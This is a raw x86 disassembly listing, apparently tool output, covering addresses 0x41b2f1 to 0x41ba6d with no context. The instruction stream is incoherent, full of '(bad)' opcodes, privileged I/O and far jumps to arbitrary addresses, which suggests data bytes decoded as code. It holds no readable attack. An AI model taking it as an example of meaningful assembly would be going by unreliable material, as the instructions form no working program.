  41b2f1:	jmp    DWORD PTR [edi]
  41b2f3:	pop    ds
  41b2f4:	popa   
  41b2f5:	push   es
  41b2f6:	and    ebp,ecx
  41b2f8:	dec    esi
  41b2f9:	mov    bl,0x56
  41b2fb:	jnp    0x41b370
  41b2fd:	mov    al,ds:0x79309f5c
  41b302:	outs   dx,BYTE PTR ds:[esi]
  41b303:	pushf  
  41b304:	cmp    edi,DWORD PTR [ebx+0x6d]
  41b307:	xor    eax,0xa10c61e5
  41b30c:	dec    ebx
  41b30e:	rol    BYTE PTR [ecx+0x74b5abda],cl
  41b314:	xchg   edx,eax
  41b315:	(bad)  
  41b317:	add    eax,DWORD PTR ds:0x60b693ee
  41b31d:	xchg   esp,eax
  41b31e:	jo     0x41b2d0
  41b320:	mov    dl,0x65
  41b322:	mov    eax,ebp
  41b324:	ja     0x41b323
  41b326:	add    DWORD PTR [ecx+ebp*1],edx
  41b329:	or     ch,BYTE PTR [ebx]
  41b32b:	push   esi
  41b32d:	sub    BYTE PTR [ebx-0x62],cl
  41b330:	cdq    
  41b331:	adc    BYTE PTR [esi+0x2219baaf],0xf0
  41b338:	test   cl,bl
  41b33a:	cmp    BYTE PTR [esi-0x72],dl
  41b33d:	dec    ebx
  41b33e:	or     DWORD PTR [eax+0x24],ecx
  41b341:	mov    gs,WORD PTR [esi-0x22]
  41b344:	call   0xb3c5a395
  41b349:	repnz mov esp,0x9f75a644
  41b34f:	arpl   WORD PTR [edi+0x6e8f9ab5],si
  41b355:	adc    eax,0x54eccf3e
  41b35a:	lock retf 0xd735
  41b35e:	push   ebp
  41b35f:	mov    dh,0xd2
  41b361:	out    dx,eax
  41b362:	mov    ds:0x52b04591,eax
  41b367:	push   0x4b11cd6f
  41b36c:	aad    0x84
  41b36e:	push   esp
  41b36f:	and    eax,0x2f261ef0
  41b374:	adc    dl,cl
  41b376:	xchg   DWORD PTR [ebp+0x24aaf0a4],esi
  41b37c:	mov    eax,0x28d837c4
  41b381:	rcr    BYTE PTR gs:[ecx],0xf3
  41b385:	mov    eax,ds:0x3d567e6a
  41b38a:	mov    esp,DWORD PTR [ecx-0x65]
  41b38d:	push   edi
  41b38e:	jns    0x41b354
  41b390:	loop   0x41b398
  41b392:	mov    cl,0xfe
  41b394:	add    al,cl
  41b396:	and    eax,0xa38cb56d
  41b39b:	push   0xffffffea
  41b39d:	dec    eax
  41b39e:	inc    ebp
  41b39f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3a0:	jmp    0xa9cc:0x701d6858
  41b3a7:	mov    ebx,0xf30df675
  41b3ac:	ror    BYTE PTR [ebp+0x7a170a8],0x45
  41b3b3:	cs nop
  41b3b5:	jb     0x41b387
  41b3b7:	dec    BYTE PTR [eax+0x2122bac9]
  41b3bd:	mov    esp,0xf988b1f0
  41b3c2:	aam    0x4e
  41b3c4:	jmp    0x4916:0x253eb4b9
  41b3cb:	xchg   ebp,eax
  41b3cc:	adc    eax,0xbfcbba05
  41b3d1:	cld    
  41b3d2:	stos   DWORD PTR es:[edi],eax
  41b3d3:	(bad)  
  41b3d4:	clc    
  41b3d5:	(bad)  
  41b3d6:	jmp    0x7c22662e
  41b3db:	jge    0x41b371
  41b3dd:	jl     0x41b3a7
  41b3df:	hlt    
  41b3e0:	push   ss
  41b3e1:	or     al,0x1f
  41b3e3:	mov    dh,0x0
  41b3e5:	pop    edi
  41b3e6:	sbb    al,0x58
  41b3e8:	sub    BYTE PTR [esi+0x3b2260f7],0xc9
  41b3ef:	dec    esi
  41b3f0:	ror    DWORD PTR [esi],cl
  41b3f2:	dec    ebx
  41b3f3:	pop    edx
  41b3f4:	adc    al,0xc
  41b3f6:	rcr    ecx,1
  41b3f8:	ja     0x41b3d6
  41b3fa:	cmp    DWORD PTR [esi],eax
  41b3fc:	rcl    BYTE PTR [ebx-0x5933f8fa],cl
  41b402:	adc    eax,0x80b9bde0
  41b408:	popf   
  41b409:	enter  0xc982,0xb4
  41b40d:	xor    al,0xea
  41b40f:	loopne 0x41b474
  41b411:	sbb    DWORD PTR [esi-0x41f043b4],esp
  41b417:	pusha  
  41b418:	dec    eax
  41b419:	lahf   
  41b41a:	ds push ds
  41b41c:	fld    QWORD PTR [ebx+0x52536642]
  41b422:	ja     0x41b44f
  41b424:	push   ecx
  41b425:	imul   eax,DWORD PTR [esi],0x133190c0
  41b42b:	jmp    0xd13d:0xf3cbd6e6
  41b432:	push   ss
  41b433:	fucom  st(4)
  41b435:	in     al,0x17
  41b437:	pushf  
  41b438:	daa    
  41b439:	xchg   ebx,eax
  41b43a:	fneni(8087 only) 
  41b43c:	lock sbb DWORD PTR [esi-0x5f558bcd],ebx
  41b443:	ds int3 
  41b445:	in     eax,0x54
  41b447:	(bad)  
  41b448:	dec    esp
  41b449:	mov    cs,WORD PTR [ecx+0x4a]
  41b44c:	lods   al,BYTE PTR ds:[esi]
  41b44d:	cdq    
  41b44e:	stos   BYTE PTR es:[edi],al
  41b44f:	(bad)  
  41b450:	fsubr  QWORD PTR [ebp+0xa]
  41b453:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b454:	xchg   DWORD PTR [edi],ebx
  41b456:	fist   DWORD PTR [ebp+0x3e36a027]
  41b45c:	or     ecx,esp
  41b45e:	pop    eax
  41b45f:	or     ah,BYTE PTR [edx-0x8a070ac]
  41b465:	or     BYTE PTR [eax],cl
  41b467:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b468:	mov    ah,0xf4
  41b46a:	(bad)  
  41b46b:	sbb    eax,0xaec2df88
  41b470:	jb     0x41b48e
  41b472:	adc    ch,BYTE PTR [ebx]
  41b474:	aad    0xf0
  41b476:	xlat   BYTE PTR ds:[ebx]
  41b477:	fwait
  41b478:	or     cl,BYTE PTR [esi]
  41b47a:	mov    eax,ds:0xd07c8a57
  41b47f:	sub    ebp,ebx
  41b481:	pusha  
  41b482:	int3   
  41b483:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b484:	and    al,0x3a
  41b486:	(bad)  
  41b487:	and    eax,0x637c35fd
  41b48c:	(bad)  
  41b48d:	popf   
  41b48e:	jne    0x41b4d6
  41b490:	stc    
  41b491:	inc    edi
  41b492:	push   esi
  41b493:	hlt    
  41b494:	enter  0xf898,0xb5
  41b498:	imul   esp,DWORD PTR [edi],0x7a4972a4
  41b49e:	fidivr WORD PTR [edx]
  41b4a0:	ins    BYTE PTR es:[edi],dx
  41b4a1:	sbb    esi,DWORD PTR [edx+0x20]
  41b4a4:	add    bh,bl
  41b4a6:	add    eax,0xd4374661
  41b4ab:	mov    ecx,0xfcb6bf0
  41b4b0:	outs   dx,BYTE PTR ds:[esi]
  41b4b1:	mov    edx,0x81a20e5a
  41b4b6:	xchg   ebx,eax
  41b4b7:	nop
  41b4b8:	cmp    dh,BYTE PTR [eax-0x6717cef1]
  41b4be:	nop
  41b4bf:	jno    0x41b4d7
  41b4c1:	adc    BYTE PTR [edi-0x3],ah
  41b4c4:	fsub   QWORD PTR [ebp-0x28b6f33e]
  41b4ca:	es jge 0x41b4c0
  41b4cd:	jmp    0x3e81e29d
  41b4d2:	(bad)  
  41b4d3:	ret    
  41b4d4:	push   edx
  41b4d5:	out    dx,al
  41b4d6:	xchg   ecx,eax
  41b4d7:	pop    DWORD PTR [edx*1-0xfb1100b]
  41b4de:	sub    ebp,DWORD PTR [edx]
  41b4e0:	loopne 0x41b54c
  41b4e2:	lahf   
  41b4e3:	outs   dx,DWORD PTR ds:[esi]
  41b4e4:	dec    esp
  41b4e5:	fild   QWORD PTR [ecx]
  41b4e7:	les    edx,FWORD PTR [ecx-0x61]
  41b4ea:	mov    ebp,0x97743a67
  41b4ef:	repz sahf 
  41b4f1:	mov    ds:0x92b07d2e,eax
  41b4f6:	test   eax,0xca5b8359
  41b4fb:	xor    DWORD PTR [edx],0xf1d20018
  41b501:	rcl    BYTE PTR [edi+eax*2+0x2d97d207],1
  41b508:	pop    esp
  41b509:	arpl   si,cx
  41b50b:	outs   dx,DWORD PTR ds:[esi]
  41b50c:	and    BYTE PTR [ebp+0x16],bh
  41b50f:	stc    
  41b510:	cld    
  41b511:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b512:	nop
  41b513:	fild   QWORD PTR [ebx+ecx*1]
  41b516:	cwde   
  41b517:	mov    dl,0x25
  41b519:	cmp    eax,0x21162533
  41b51e:	loope  0x41b4a0
  41b520:	mov    bh,0xc4
  41b522:	pop    ebp
  41b523:	jne    0x41b59e
  41b525:	inc    ebx
  41b526:	sbb    al,0xd0
  41b528:	push   cs
  41b529:	pushf  
  41b52a:	enter  0x6686,0x4b
  41b52e:	jno    0x41b5ac
  41b530:	ins    BYTE PTR es:[edi],dx
  41b531:	pop    esp
  41b532:	and    ah,BYTE PTR [ebp-0x4c]
  41b535:	cmp    al,0x7b
  41b537:	inc    edx
  41b538:	popa   
  41b539:	dec    ebx
  41b53a:	fcom   QWORD PTR [eax+edi*4-0x56551cf9]
  41b541:	aas    
  41b542:	mov    DWORD PTR [edi-0x7e],ebx
  41b545:	out    0x93,eax
  41b547:	scas   eax,DWORD PTR es:[edi]
  41b548:	mov    ah,0x71
  41b54a:	sub    al,BYTE PTR [ebp*8-0x208c056]
  41b551:	fnstenv [ebx+0x47ddeaf8]
  41b557:	test   eax,0x61274ba9
  41b55c:	fsub   QWORD PTR [esi+0x5e]
  41b55f:	sbb    ebp,ecx
  41b561:	mov    bh,al
  41b563:	xlat   BYTE PTR ds:[ebx]
  41b564:	clc    
  41b565:	pop    ebx
  41b566:	push   0x22
  41b568:	(bad)  
  41b569:	adc    DWORD PTR [ebp+0x68b51ee5],esp
  41b56f:	lods   al,BYTE PTR ds:[esi]
  41b570:	mov    es,WORD PTR [ecx+0x7de95c44]
  41b576:	retf   0xe1f0
  41b579:	add    eax,0xadd7109a
  41b57e:	mov    esp,0x8332aee0
  41b583:	or     al,0x61
  41b585:	in     al,dx
  41b586:	scas   eax,DWORD PTR es:[edi]
  41b587:	push   ss
  41b588:	dec    esp
  41b589:	xor    ch,BYTE PTR [edx+0x16439e32]
  41b58f:	mov    ah,0x3
  41b591:	adc    DWORD PTR [ebx+0x68615963],ebx
  41b597:	fild   WORD PTR [eax]
  41b599:	lds    ecx,FWORD PTR ds:0xc3b37875
  41b59f:	jmp    0x8155c166
  41b5a4:	mov    ah,0x94
  41b5a6:	adc    BYTE PTR [eax+ebx*4],cl
  41b5a9:	neg    DWORD PTR [ebp+0x28]
  41b5ac:	mov    bl,BYTE PTR [bx+di+0x7f17]
  41b5b1:	mov    fs,ebx
  41b5b3:	lods   eax,DWORD PTR ds:[esi]
  41b5b4:	xchg   ebp,eax
  41b5b5:	ret    
  41b5b6:	sbb    al,0xfa
  41b5b8:	mov    esi,0x4848e2eb
  41b5bd:	push   ebx
  41b5be:	adc    DWORD PTR [ecx-0x14],esp
  41b5c1:	nop
  41b5c2:	adc    eax,0xc80114dd
  41b5c7:	test   DWORD PTR [ebx+0x77b59308],esi
  41b5cd:	popf   
  41b5ce:	jae    0x41b645
  41b5d0:	sbb    al,0x76
  41b5d2:	(bad)  
  41b5d3:	jb     0x41b62c
  41b5d5:	rol    BYTE PTR [ebp-0x74],cl
  41b5d8:	popf   
  41b5d9:	dec    esi
  41b5da:	cmp    ebx,eax
  41b5dc:	mov    ds:0x49284330,eax
  41b5e1:	mov    ebp,0x2ef969f3
  41b5e6:	out    dx,al
  41b5e7:	es adc eax,0xd2a43ca1
  41b5ed:	inc    ebp
  41b5ee:	adc    BYTE PTR [ebx+0x5dc951],dl
  41b5f4:	push   ds
  41b5f5:	sahf   
  41b5f6:	inc    ebx
  41b5f7:	pop    ecx
  41b5f8:	popf   
  41b5f9:	xor    eax,0x780b20fa
  41b5fe:	call   0xe59cff3a
  41b603:	ret    
  41b604:	popf   
  41b605:	push   ebp
  41b606:	in     eax,dx
  41b607:	ins    BYTE PTR es:[edi],dx
  41b608:	ins    DWORD PTR es:[edi],dx
  41b609:	pop    ss
  41b60a:	fdiv   DWORD PTR gs:[edx]
  41b60d:	mov    ah,0xd4
  41b60f:	stc    
  41b610:	jecxz  0x41b622
  41b612:	adc    bh,ch
  41b614:	mov    ds:0x5939eb20,eax
  41b619:	mov    ebp,fs
  41b61b:	pop    esp
  41b61c:	nop
  41b61d:	int3   
  41b61e:	mov    dl,0x4b
  41b620:	sbb    bl,BYTE PTR [ebx]
  41b622:	icebp  
  41b623:	cmp    al,dh
  41b625:	mov    eax,ds:0x4b520464
  41b62a:	xor    al,0xdf
  41b62c:	dec    esp
  41b62d:	sbb    al,0x92
  41b62f:	pop    esp
  41b630:	jl     0x41b66b
  41b632:	cld    
  41b633:	lods   al,BYTE PTR ds:[esi]
  41b634:	jmp    0x41b5d0
  41b636:	and    eax,0x2db98693
  41b63b:	inc    esi
  41b63c:	dec    ebp
  41b63d:	sub    BYTE PTR ds:0xefaf5628,dh
  41b643:	sbb    al,0xbf
  41b645:	fmul   QWORD PTR [ecx]
  41b647:	(bad)  
  41b648:	nop
  41b649:	push   0x3c4b5e72
  41b64e:	add    al,0xd3
  41b650:	fimul  WORD PTR [eax+0x23634f71]
  41b656:	xor    edx,DWORD PTR ds:0x7ef4cc35
  41b65c:	pop    ebx
  41b65d:	dec    edi
  41b65e:	sbb    BYTE PTR [ebx-0x71],bl
  41b661:	inc    eax
  41b662:	push   esp
  41b663:	retf   
  41b664:	gs jne 0x4f9e14ab
  41b66b:	jg     0x41b664
  41b66d:	push   ds
  41b66e:	xor    al,0x2a
  41b670:	jae    0x41b61b
  41b672:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b673:	pop    edx
  41b674:	stos   BYTE PTR es:[edi],al
  41b675:	addr16 mov ds:0x2a68,eax
  41b679:	and    al,0x38
  41b67b:	cmp    al,0xce
  41b67d:	imul   DWORD PTR [esi+ebx*4+0x50]
  41b681:	ret    0x427
  41b684:	jae    0x41b64c
  41b686:	fcmove st,st(5)
  41b688:	push   esi
  41b689:	out    0x63,al
  41b68b:	xor    edi,esp
  41b68d:	xor    BYTE PTR ds:0xd4e12862,bh
  41b693:	pop    ebp
  41b694:	aas    
  41b695:	rcl    BYTE PTR [eax-0x4d4ee4da],cl
  41b69b:	or     al,0xc3
  41b69d:	inc    eax
  41b69e:	ss sahf 
  41b6a0:	adc    cl,BYTE PTR [ebx+ecx*1+0x71]
  41b6a4:	int    0x9b
  41b6a6:	push   ecx
  41b6a7:	and    ebp,edi
  41b6a9:	scas   eax,DWORD PTR es:[edi]
  41b6aa:	pop    ebx
  41b6ab:	xchg   BYTE PTR [esi],ah
  41b6ad:	push   es
  41b6ae:	jmp    0x41b701
  41b6b0:	xor    DWORD PTR [edx+0x4d],ecx
  41b6b3:	mov    ecx,0x616cf249
  41b6b8:	fwait
  41b6b9:	add    al,0x8c
  41b6bb:	shl    ah,1
  41b6bd:	les    esi,FWORD PTR [eax+0x4b]
  41b6c0:	xor    eax,0x4dfe4873
  41b6c5:	ret    0xc805
  41b6c8:	scas   al,BYTE PTR es:[edi]
  41b6c9:	popf   
  41b6ca:	into   
  41b6cb:	enter  0x4f90,0x53
  41b6cf:	ret    0x7320
  41b6d2:	push   DWORD PTR [ecx+eiz*2-0xf]
  41b6d6:	test   cl,ch
  41b6d8:	inc    esp
  41b6d9:	outs   dx,DWORD PTR ds:[esi]
  41b6da:	aaa    
  41b6db:	mov    ?,WORD PTR [eax+eiz*2]
  41b6de:	aam    0x97
  41b6e0:	ficom  DWORD PTR [edx+0x6c34cd10]
  41b6e6:	mov    bh,0xcd
  41b6e8:	loopne 0x41b75b
  41b6ea:	int    0x4
  41b6ec:	xor    al,0x73
  41b6ee:	mov    BYTE PTR [eax+edx*1+0x53d68bd3],ah
  41b6f5:	fsin   
  41b6f7:	xchg   esp,eax
  41b6f8:	cmp    BYTE PTR [eax+ecx*1+0x2d],0x7b
  41b6fd:	jl     0x41b734
  41b6ff:	inc    ecx
  41b700:	jb     0x41b719
  41b702:	cmp    ah,ah
  41b704:	adc    cl,BYTE PTR [edi-0x7c9b7d15]
  41b70a:	push   esi
  41b70b:	ins    DWORD PTR es:[edi],dx
  41b70c:	sub    al,0x36
  41b70e:	push   ecx
  41b70f:	(bad)  
  41b710:	sub    ebp,DWORD PTR [edx]
  41b712:	jo     0x41b6dd
  41b714:	pop    ebx
  41b715:	das    
  41b716:	jae    0x41b783
  41b718:	pop    eax
  41b719:	cmp    eax,0x12c1d19
  41b71e:	pop    ebx
  41b71f:	fisubr WORD PTR [edx+0x2e]
  41b722:	mov    eax,0x9cfd4977
  41b727:	pop    edx
  41b728:	(bad)  
  41b72a:	mov    BYTE PTR [edi-0x7ccd9a45],cl
  41b730:	test   BYTE PTR [esi+0x2c50a9b7],bl
  41b736:	inc    esi
  41b737:	add    bh,BYTE PTR [edx+ebx*8+0x29e2b72e]
  41b73e:	gs mov fs,ebx
  41b741:	sbb    al,0x50
  41b743:	out    dx,eax
  41b744:	(bad)  
  41b745:	mov    ebx,0xab36bf0a
  41b74a:	push   edi
  41b74b:	aam    0x90
  41b74d:	lahf   
  41b74e:	test   bh,dl
  41b750:	sbb    BYTE PTR [edx+0x30110643],al
  41b756:	pop    es
  41b757:	loop   0x41b703
  41b759:	cmp    bh,cl
  41b75b:	div    BYTE PTR [ebx-0x2c]
  41b75e:	aas    
  41b75f:	or     BYTE PTR [edi],ch
  41b761:	bound  ecx,QWORD PTR [ebx-0x36]
  41b764:	pop    esi
  41b765:	xchg   edx,eax
  41b766:	mov    ebx,0x6baee768
  41b76b:	pop    ss
  41b76c:	repz inc eax
  41b76e:	pop    edi
  41b76f:	loopne 0x41b7ae
  41b771:	mov    dl,0x50
  41b773:	data16 mov dh,0x56
  41b776:	mov    ecx,0x89f74419
  41b77b:	in     eax,dx
  41b77c:	ficom  WORD PTR [ecx-0x4e54d48e]
  41b782:	mov    cl,0x96
  41b784:	fwait
  41b785:	or     DWORD PTR [esi+0x27],ebp
  41b788:	mov    esi,0xc9ec71d2
  41b78d:	outs   dx,BYTE PTR ss:[esi]
  41b78f:	sbb    al,0xaf
  41b791:	mov    ch,0x9a
  41b793:	dec    ebp
  41b794:	(bad)  
  41b796:	cld    
  41b797:	pop    ecx
  41b798:	add    bh,BYTE PTR [esi-0x9]
  41b79b:	inc    edx
  41b79c:	mov    ebp,0x1c0a9acc
  41b7a1:	sbb    edx,ebx
  41b7a3:	or     BYTE PTR [edx-0x2e4487f1],0x7e
  41b7aa:	push   0x70
  41b7ac:	inc    esp
  41b7ad:	adc    BYTE PTR [edx],dl
  41b7af:	pushf  
  41b7b0:	(bad)  
  41b7b1:	push   ebp
  41b7b2:	add    BYTE PTR [ebp+0x149d893e],dl
  41b7b8:	sub    eax,DWORD PTR [edx]
  41b7ba:	sub    al,0xac
  41b7bc:	dec    esp
  41b7bd:	mov    ds:0x52cbb50c,eax
  41b7c2:	fsub   DWORD PTR [ebp+0x56]
  41b7c5:	mov    eax,0x77b5764f
  41b7ca:	gs shr ecx,0xa9
  41b7ce:	scas   eax,DWORD PTR es:[edi]
  41b7cf:	add    al,0x27
  41b7d1:	and    edx,edi
  41b7d3:	nop
  41b7d4:	ins    BYTE PTR es:[edi],dx
  41b7d5:	pop    ds
  41b7d6:	sub    eax,0xa4b09b93
  41b7db:	aam    0x56
  41b7dd:	sub    cl,BYTE PTR [esi-0x5e]
  41b7e0:	mov    bh,0xa8
  41b7e2:	push   ebp
  41b7e3:	adc    eax,0xc93a5f7c
  41b7e8:	or     eax,0xb6ae8a67
  41b7ed:	cdq    
  41b7ee:	sbb    eax,0x806e6100
  41b7f3:	popf   
  41b7f4:	jmp    0xa4f2e79f
  41b7f9:	out    0xc7,eax
  41b7fb:	sub    esp,DWORD PTR [edi]
  41b7fd:	push   esp
  41b7fe:	iret   
  41b7ff:	cmp    bl,BYTE PTR [esi]
  41b801:	mov    cl,0x50
  41b803:	xchg   esi,eax
  41b804:	add    dl,BYTE PTR [ecx-0x1a7fd2a3]
  41b80a:	mov    al,ds:0xc5d97da3
  41b80f:	fstp   DWORD PTR [eax]
  41b811:	add    eax,0xa7571a22
  41b816:	stos   BYTE PTR es:[edi],al
  41b817:	add    DWORD PTR [ebp+0x2d],edi
  41b81a:	and    eax,0xd325fe54
  41b81f:	dec    esp
  41b820:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41b822:	mov    dh,0xf3
  41b824:	inc    ecx
  41b825:	add    esi,DWORD PTR [ebx+0x50]
  41b828:	push   esp
  41b829:	hlt    
  41b82a:	xchg   esi,eax
  41b82b:	or     al,0x18
  41b82d:	and    BYTE PTR [ebx-0x4b212c16],dl
  41b833:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b834:	loop   0x41b80a
  41b836:	cs das 
  41b838:	lods   eax,DWORD PTR ds:[esi]
  41b839:	dec    edx
  41b83a:	pop    ss
  41b83b:	inc    ecx
  41b83c:	sti    
  41b83d:	lock mov ds:0x7fda9df,eax
  41b843:	inc    ebp
  41b844:	clc    
  41b845:	test   edx,eax
  41b847:	adc    cl,bh
  41b849:	(bad)  
  41b84a:	js     0x41b7e0
  41b84c:	call   0xd425:0x795dc35
  41b853:	call   0xedfb43da
  41b858:	mov    bh,0x6c
  41b85a:	cmp    al,0x32
  41b85c:	test   BYTE PTR [ebp+0x69],al
  41b85f:	mov    ds:0xeb8d86bf,eax
  41b864:	xor    eax,0xa559bad5
  41b869:	jg     0x41b847
  41b86b:	repnz mov ebx,0xb7129eee
  41b871:	leave  
  41b872:	and    BYTE PTR [ebp+0x4dd21ff6],0xd7
  41b879:	(bad)  
  41b87a:	popf   
  41b87b:	jecxz  0x41b8b6
  41b87d:	pop    ds
  41b87e:	mov    cs,WORD PTR [ebx]
  41b880:	divps  xmm3,XMMWORD PTR [edx+0x74]
  41b884:	(bad)  
  41b885:	int    0xa8
  41b887:	addr16 push ss
  41b889:	adc    ebp,ebx
  41b88b:	mov    bh,0x25
  41b88d:	sub    al,bh
  41b88f:	pmaxsw mm4,mm4
  41b892:	cld    
  41b893:	inc    ebp
  41b894:	aaa    
  41b895:	imul   edx,DWORD PTR [edx-0x5a0da85b],0xb1aa5730
  41b89f:	mov    ch,0x4d
  41b8a1:	xchg   edx,eax
  41b8a2:	and    DWORD PTR [ecx+0x59],0xffffffbc
  41b8a6:	inc    esi
  41b8a7:	test   al,0xac
  41b8a9:	push   ds
  41b8aa:	dec    esi
  41b8ab:	or     DWORD PTR [ecx-0x39],0x42
  41b8af:	loopne 0x41b8d5
  41b8b1:	pop    es
  41b8b2:	inc    ecx
  41b8b3:	mov    ds:0xd5720666,al
  41b8b8:	imul   esi,DWORD PTR [esi+ebx*8-0x58],0xd4bd7e1c
  41b8c0:	dec    ebx
  41b8c1:	mov    dl,0x7d
  41b8c3:	mov    dl,0xc
  41b8c5:	addr16 adc al,0xf1
  41b8c8:	shl    BYTE PTR fs:0x660b3d17,0xb1
  41b8d0:	inc    ecx
  41b8d1:	(bad)  
  41b8d2:	fisub  WORD PTR [edi-0x5f]
  41b8d5:	cmp    esp,ecx
  41b8d7:	imul   edx,DWORD PTR [eax],0xffffff89
  41b8da:	inc    ebp
  41b8db:	ss xchg esi,eax
  41b8dd:	test   DWORD PTR [edx-0x46],esi
  41b8e0:	retf   
  41b8e1:	dec    esi
  41b8e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8e3:	in     eax,dx
  41b8e4:	test   DWORD PTR [ebx],esp
  41b8e6:	pushf  
  41b8e7:	pop    ds
  41b8e8:	lock pop ds
  41b8ea:	mov    bl,0x6a
  41b8ec:	call   0x8240a800
  41b8f1:	push   esp
  41b8f2:	dec    ecx
  41b8f3:	popf   
  41b8f4:	jb     0x41b8dc
  41b8f6:	icebp  
  41b8f7:	xor    BYTE PTR [ecx],dh
  41b8f9:	pop    es
  41b8fa:	gs aaa 
  41b8fc:	das    
  41b8fd:	cs inc esi
  41b8ff:	xchg   DWORD PTR [ebx+esi*1+0x5a],eax
  41b903:	push   ebx
  41b904:	out    dx,al
  41b905:	sbb    al,BYTE PTR [eax]
  41b907:	mov    dh,0x1a
  41b909:	je     0x41b890
  41b90b:	fdivr  QWORD PTR [ebx+0x1a]
  41b90e:	loopne 0x41b89c
  41b910:	xor    edx,DWORD PTR [edx-0x5661ba02]
  41b916:	popf   
  41b917:	or     eax,0x57aab12
  41b91c:	sub    eax,0xe2ebe8b9
  41b921:	jno    0x41b8ff
  41b923:	sbb    dh,BYTE PTR [edx-0x60]
  41b926:	clts   
  41b928:	retf   0x6264
  41b92b:	push   0x59
  41b92d:	arpl   WORD PTR [edx],bx
  41b92f:	or     al,dl
  41b931:	mov    cl,0xf3
  41b933:	lock sbb ch,cl
  41b936:	outs   dx,DWORD PTR ds:[esi]
  41b937:	mov    esp,0xc16bf47b
  41b93c:	mov    eax,ds:0x9b34da42
  41b941:	mov    bl,BYTE PTR [edx+0x43f77f77]
  41b947:	xor    eax,DWORD PTR [ebx+esi*8-0x6a4a6303]
  41b94e:	inc    edi
  41b94f:	mov    ebp,DWORD PTR [ebp-0x4e7b03d3]
  41b955:	mov    esi,0xcafd6ebc
  41b95a:	pop    esi
  41b95b:	xlat   BYTE PTR ds:[bx]
  41b95d:	leave  
  41b95e:	mov    esi,0x40df1de9
  41b963:	stos   DWORD PTR es:[edi],eax
  41b964:	sahf   
  41b965:	pop    ds
  41b966:	xchg   ebp,eax
  41b967:	sub    DWORD PTR [edx+0x3e],esi
  41b96a:	jge    0x41b9b7
  41b96c:	sub    ebx,edx
  41b96e:	adc    BYTE PTR [ecx-0x272ebcd4],ah
  41b974:	nop
  41b975:	stc    
  41b976:	cld    
  41b977:	jmp    0xc1aa517
  41b97c:	out    0x59,al
  41b97e:	nop
  41b97f:	xchg   al,bl
  41b981:	mov    esp,0xce328399
  41b986:	popf   
  41b987:	call   0xa46f1c0b
  41b98c:	ret    0xe36b
  41b98f:	xchg   esp,eax
  41b990:	ret    
  41b991:	mov    DWORD PTR [ebx],edi
  41b993:	jge    0x41b9b4
  41b995:	push   eax
  41b996:	loope  0x41b970
  41b998:	inc    esp
  41b999:	pop    eax
  41b99a:	mov    bl,0xd2
  41b99c:	jg     0x41b9f5
  41b99e:	push   eax
  41b99f:	jmp    0x41ba07
  41b9a1:	ss mov ecx,0xa59d731f
  41b9a7:	test   dh,bh
  41b9a9:	jg     0x41b975
  41b9ab:	inc    ebx
  41b9ac:	(bad)  
  41b9ad:	aad    0xdb
  41b9af:	xchg   edx,eax
  41b9b0:	sti    
  41b9b1:	xor    al,0x7d
  41b9b3:	pop    edi
  41b9b4:	pop    esi
  41b9b5:	jbe    0x41ba35
  41b9b7:	out    dx,al
  41b9b8:	and    dl,dh
  41b9ba:	sub    edx,DWORD PTR [ecx+0x68cc3edd]
  41b9c0:	jae    0x41ba31
  41b9c2:	sar    ebp,0x43
  41b9c5:	mov    DWORD PTR ds:0x54b21b43,eax
  41b9cb:	xlat   BYTE PTR ds:[ebx]
  41b9cc:	xchg   BYTE PTR [ebx+0x37],bl
  41b9cf:	(bad)  
  41b9d0:	stos   BYTE PTR es:[edi],al
  41b9d1:	fimul  DWORD PTR [esi]
  41b9d3:	dec    BYTE PTR [ebx+eax*1+0x3c4b8223]
  41b9da:	pop    eax
  41b9db:	sbb    ecx,DWORD PTR [edx-0x2b]
  41b9de:	ds inc edi
  41b9e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9e1:	out    dx,al
  41b9e2:	sub    bh,BYTE PTR ds:0x31b1d49d
  41b9e8:	mov    ecx,DWORD PTR [edx-0x2c14837f]
  41b9ee:	mov    bl,BYTE PTR [edi-0x31]
  41b9f1:	fisubr DWORD PTR [edx-0x61]
  41b9f4:	je     0x41b99c
  41b9f6:	int    0x4c
  41b9f8:	(bad)  
  41b9f9:	pop    ebx
  41b9fa:	lock sub al,0xe0
  41b9fd:	enter  0xaec7,0x29
  41ba01:	repz imul ecx,eax,0x5a
  41ba05:	mov    WORD PTR [edx],es
  41ba07:	daa    
  41ba08:	adc    al,0x51
  41ba0a:	inc    eax
  41ba0b:	cld    
  41ba0c:	setbe  BYTE PTR [esi+0x30]
  41ba10:	xchg   edi,eax
  41ba11:	loope  0x41ba73
  41ba13:	cmp    eax,0x1728f198
  41ba18:	and    BYTE PTR [esi],dh
  41ba1a:	outs   dx,BYTE PTR ds:[esi]
  41ba1b:	fnsave [edx-0x17]
  41ba1e:	mov    ah,0xfc
  41ba20:	cmp    edi,DWORD PTR [ebp-0x59]
  41ba23:	and    eax,0xcc910ede
  41ba28:	ret    
  41ba29:	aam    0x2d
  41ba2b:	sub    eax,0x6b259f46
  41ba30:	retf   
  41ba31:	test   DWORD PTR [ebx-0x27],ebp
  41ba34:	std    
  41ba35:	adc    al,0xe1
  41ba37:	mov    al,ds:0x3c0c055
  41ba3c:	adc    DWORD PTR es:[ebp-0x2e],esp
  41ba40:	aad    0x87
  41ba42:	aam    0x7e
  41ba44:	outs   dx,DWORD PTR ds:[esi]
  41ba45:	add    eax,0x8c66f6e5
  41ba4a:	or     edi,ecx
  41ba4c:	jne    0x41ba6d
  41ba4e:	push   ebx
  41ba4f:	sbb    ecx,DWORD PTR [edx]
  41ba51:	cmp    BYTE PTR [eax+0x1f],ah
  41ba54:	or     BYTE PTR [edi+0x36],dh
  41ba57:	icebp  
  41ba58:	jmp    0xe7bd0d14
  41ba5d:	mov    ds:0xacd26629,eax
  41ba62:	mov    DWORD PTR ds:0x66608687,esi
  41ba68:	add    DWORD PTR [edi+0x7d],ebp
  41ba6b:	mov    ss,WORD PTR [eax]
  41ba6d:	test   BYTE PTR [esi+eax*1+0x60dfcd5f],bl
